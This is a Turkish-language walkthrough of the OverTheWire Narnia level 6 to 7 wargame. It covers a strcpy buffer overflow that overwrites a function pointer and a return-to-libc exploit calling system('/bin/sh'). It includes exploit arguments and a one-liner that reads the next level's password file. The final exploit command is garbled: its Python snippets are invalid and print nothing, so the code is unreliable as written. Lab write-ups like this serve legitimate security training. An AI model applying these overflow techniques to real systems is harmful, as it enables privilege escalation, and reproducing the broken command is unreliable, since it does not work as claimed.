# OverTheWire — Narnia Level 6 → 7

> Hedef: `narnia6`'dan `narnia7` şifresi. Sonuç: **`**********`** (gizlendi)
> Teknik: iki `strcpy` overflow → fonksiyon pointer'ı ezme → **return-to-libc** (`system`).

---

## 1. Bağlantı
```bash
ssh narnia6@narnia.labs.overthewire.org -p 2226
```

## 2. Kaynak (gerçek binary'den — `setreuid` VAR)
```c
unsigned long get_sp(void){ __asm__("movl %esp,%eax\n\t" "and $0xff000000, %eax"); }
int main(int argc, char *argv[]){
    char b1[8], b2[8];
    int (*fp)(char*) = (int(*)(char*))&puts;
    if(argc!=3){ ...; exit(-1); }
    for(i=0; environ[i]; i++) memset(environ[i],0,strlen(environ[i]));   // env sil
    for(i=3; argv[i]; i++)    memset(argv[i],0,strlen(argv[i]));         // argv[3+] sil
    strcpy(b1,argv[1]);                       // b1 taşar -> fp'yi ez
    strcpy(b2,argv[2]);                       // b2 taşar -> b1'i "/bin/sh" yap
    if(((unsigned long)fp & 0xff000000) == get_sp()) exit(-1);   // fp stack'i gösterirse ÇIK
    setreuid(geteuid(),geteuid());
    fp(b1);                                   // fp==system ise: system(b1)
}
```
> ✅ **Canlı teyit:** Daha önce "kaynakta setreuid eksik" sandığım sürüm yanlışmış — gerçek
> binary'de `fp(b1)` öncesi `setreuid(geteuid(),geteuid())` **var**.

## 3. Zafiyet + engel
İki sınırsız `strcpy`. Stack düzeni `[b2][b1][fp]` → `b1` taşması `fp`'ye, `b2` taşması `b1`'e ulaşır.
- **`get_sp()` ≈ `0xff000000`:** `fp` stack'i (`0xff..`) gösteremez → stack shellcode YASAK.
- **`system` libc'de** (`0xf7..`) → `0xf7000000 != 0xff000000` → guard'ı geçer. Tek yol ret2libc.

## 4. `system` adresi (ASLR kapalı)
gdb narnia'da çalışıyor ama bir helper daha temiz (ASLR kapalı → helper'ın libc `system`
adresi = narnia6'nınki):
```c
int main(){ printf("SYS=%p\n", (void*)&system); return 0; }   // gcc -m32
# SYS=f7dd18e0  (canlı çözümde)
```

## 5. Exploit — sıra önemli
```
argv[1] = "A"*8 + pack(system)     # strcpy(b1): b1 dolar, taşma fp=system
argv[2] = "B"*8 + "/bin/sh"        # strcpy(b2): b2 dolar, taşma b1="/bin/sh"
```
`strcpy(b1)` ÖNCE → fp=system; `strcpy(b2)` SONRA → b1="/bin/sh" (b2 taşması yalnız b1'e
ulaşır, fp'yi bozmaz). Sonuç: `fp(b1) = system("/bin/sh")`.
```bash
# environ silindi -> PATH yok -> mutlak yol
python3 -c 'timed: "/usr/bin/id; /bin/cat /etc/narnia_pass/narnia7"' | \
  /narnia/narnia6 "$(python3 -c "b'A'*8 + pack('<I', SYS)")" 'BBBBBBBB/bin/sh'
```
Çıktı: `uid=14007(narnia7)` → şifre.


## Dersler
| Konu | Not |
|------|-----|
| fonksiyon pointer | komşu buffer taşmasıyla `fp` ezilir |
| stack guard (`get_sp`) | stack adreslerini (`0xff..`) yasaklar → ret2libc zorunlu |
| ret2libc | `fp=system`, argüman (`"/bin/sh"`) `b1`'e yaz → `system("/bin/sh")` |
| sıra | önce b1→fp, sonra b2→b1 (b2 taşması fp'ye ulaşmaz) |
| system adresi | ASLR kapalı → helper `&system` = hedefinki |
